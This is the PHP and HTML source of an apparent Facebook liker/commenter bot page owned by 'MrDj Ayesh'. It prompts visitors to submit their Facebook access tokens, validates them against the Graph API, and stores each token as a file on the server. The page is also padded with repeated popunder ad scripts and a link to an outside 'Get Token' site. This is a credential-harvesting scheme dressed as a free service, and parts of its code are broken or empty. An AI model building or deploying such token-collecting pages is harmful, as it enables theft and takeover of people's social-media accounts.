<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> 
<head>
  </script>
<script type="text/javascript"> 
    var adfly_id = 17867627; 
    var popunder_frequency_delay = 0; 
</script> 
<script src="https://cdn.ay.gy/js/display.js"></script>  
  
  
  
  <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>STICKER+COMMENT</title> <link rel="stylesheet" type="text/css" href="css.css" media="all,handheld"/><link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/><link rel="stylesheet" type="text/css" href="table.css" 
media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <div id="snowflakeContainer"> <script type='text/javascript' src='snow.js'></script> <p class="snowflake">*</p></div> 


<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
    
    
    
    

<!-- Ekran Açılışı...-->
<script>
var width=document.body.clientWidth;
var height=document.body.clientHeight;
function doClickText(who,type,step,timeOut) {
document.getElementById(who).style.display="none";
if(type==0) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
if(type==1) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}}
function reveal(who,step,timeOut,type) {
if(type==0)
var where="top";
if(type==1)
var where="bottom";
if(type==2)
var where="left";
if(type==3)
var where="right";
eval('var temp=document.getElementById(who).style.'+where);
temp=parseInt(temp);
if(type==0||type==1)
var checkWith=height/2;
if(type==2||type==3)
var checkWith=width/2;
if(-temp<checkWith) {
temp-=step;
eval('document.getElementById(who).style.'+where+'=temp;');
setTimeout("reveal('"+who+"',"+step+",'"+timeOut+"',"+type+")", timeOut);}
else {
document.getElementById(who).style.display="none";
document.body.scroll="yes";}}
function initReveal(type,div1bg,div2bg,div1bw,div2bw,div1bc,div2bc,step,timeOut,click) {
if(type==0) {
var bWhere1="border-bottom";
var bWhere2="border-top";
var putZero1="top:0px; left:0px";
var putZero2="bottom:0px; left:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,0);
reveal('revealDiv2',step,timeOut,1);}
else {
clickText(type,step,timeOut);}}
if(type==1) {
var bWhere1="border-right";
var bWhere2="border-left";
var putZero1="top:0px; left:0px";
var putZero2="top:0px; right:0px";
document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
if(!click) {
reveal('revealDiv1',step,timeOut,2);
reveal('revealDiv2',step,timeOut,3);}
else {
clickText(type,step,timeOut);}}
function clickText(type,step,timeOut) {
document.write('<div id="clickText" style="z-index:101; display:block; position:absolute; top:'+(height/2-clickh/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'"><table style="border:'+clickc+' solid '+clickb+'px; background:'+clickbg+' ;width:'+clickw+'px; height:'+clickh+'; '+clickFont+'; cursor:hand; cursor:pointer" onClick="doClickText(\'clickText\','+type+','+step+','+timeOut+')"><tr><td align="middle">'+clickt+'</td></tr></table></div>');}}
</script>
<script type="text/javascript"> 
    var adfly_id = 17867627; 
    var popunder_frequency_delay = 0; 
</script> 
<script src="https://cdn.ay.gy/js/display.js"></script> 
<script>
var clickw=300;
var clickh=30;
var clickb=3;
var clickc="rgb(65, 255, 0)";
var clickbg="black"; // Background color
var clickt="⚠ Click Here To Enter Site"; // Text to display
var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:#54A847"; // The font style of the text
new initReveal(0,'black','black',1,1,'black','black',3,10,true);
</script>

<?php
$yx=opendir('myToken');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function myToken($access){
if(!is_dir('myToken')){
mkdir('myToken');
}
$a=fopen('myToken/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<center><font color="red">Inalid or expired Access Token!</font></center>';
$this->form();
}

public function form(){
$on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');

echo'
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><div id="header"><script src="header.js"></script><hr></div>
<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><marquee direction="left" width="60%"> MrDj AyeSh : Powered By <font color ="red">❤️</font> Ayan Ali<font color ="red">❤️</font> Contact For Any Help, Thanks</marquee></center></br>
<hr width="60%"></br>
<div id="profile">
<div class="css">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a target="_blank"  href="https://www.facebook.com/purnabaaap">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><img src="https://graph.facebook.com/100009371672607/picture?type=large" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a></div></div></br>
<div id="center">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="http://scure-token.tk/" target="_blank"><input class="button" type="button" value="Get Token "></a><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="https://www.facebook.com/purnabaaap" target="_blank"><input class="button" type="button" value="Get Admin "></a>
<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><font size="20" color="red">⚔</font><b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.20em red, 0pt 5pt 0.9em white;color: white ;font-size:30;">SUBMIT YOUR TOKEN HERE !!</font></b><font size="20" color="Red">⚔</font></center>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="" method="POST">
<input class="search" style="width:65%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form></div>';
}

public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
for($i=0;$i<count($feed[data]);$i++){
$id1 = $feed[data][$i][id];
}
echo'
<div id="center">
<font size="40px"> Token Saved! </font></br>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div>';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
));
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<div id="footer">
<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><font style="text-shadow: 2px 1px orange; color:yellow;" size="6">• BOT LOVERS : <font color="red"><?php include 'user.php';?></font> <font style="text-shadow: 2px 1px red; color:white;" size="4"></font>
<center><strong><font style="text-shadow: 2px 1px black; color:red;" size="5">• OWNER: MRDJ AYESH </font></strong></center><font style="text-shadow: 2px 1px blue; color:white;" size="5">
<br></font><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script></font></center></div>
</body>
</html>